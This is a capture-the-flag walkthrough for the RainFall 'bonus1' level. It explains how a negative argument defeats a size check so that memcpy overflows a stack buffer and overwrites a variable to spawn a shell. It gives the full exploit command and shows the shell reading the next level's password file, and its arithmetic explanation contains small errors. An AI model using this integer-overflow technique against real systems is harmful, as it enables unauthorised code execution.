# Bonus 1

<h3>source.c</h3>

```console
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char** argv) {
  int nb;                     -> esp+0x3c
  char str[40];               -> esp+0x14
  
  nb = atoi(argv[1]);
  if (nb <= 9) {
    memcpy(str, argv[2], nb * 4);
    if (nb == 0x574f4c46) {
			execl("/bin/sh", "sh", 0);
		}
  } else {
    return (1);
  }
  return (0);
}
```

<h3>Analysis</h3>

In this program, it will takes 2 param, `argv[1]` will be going through atoi and get converted into int

While `argv[2]` will be copied into char* str with `memcpy()` which can be exploited with buffer overflow

Our goal here will first be to insert a number less then 9 to get the `memcpy()` to run to inflict our attack

Next, we need to overflow the buffer to overwrite the `int nb` to become `0x574f4c46` so it will spawn the shell for us

<h3>Exploit</h3>

In order to overwrite `int nb`, we can see that the difference of address between `int nb (esp+0x3c)` - `char* str (esp+0x14)` is 40 bytes

But the biggest number we could put as `argv[1]` is 9, and the `memcpy()` will use this value * 4 to determine the write size, so the max we could write is 36 bytes

Fortunately, since `nb` is int, which is a signed value, we can take advantage of negative number!

Take a look at the example below

```console
-2147483637
| 0000 0000 0000 0000 0000 0000 0000 0000 |
| 1000 0000 0000 0000 0000 0000 0000 1011 |

-2147483637 * 4 =
| 0000 0000 0000 0000 0000 0000 0000 0010 |
| 1000 0000 0000 0000 0000 0000 0010 1100 |

We ignore the upper 32 bit, and only focus on the lower 32 bit, as this is 32bit int
So we get the following
| 1000 0000 0000 0000 0000 0000 0010 1100 |
Which is equal 44, enought to overflow the buffer

https://www.easycalculation.com/negative-binary-converter.php
```

So if we take the negative number `-2147483637` we will be able to satisfy the 1st condition of `nb <= 9`, also when it gets to multiplied by 9, we will get the result of `44`

We need offset of 40 + 4bytes to write `0x574f4c46` into the memory address of `int nb`, so this number `44` is perfect for us!

Lets try it out!

```console
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "a" * 40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```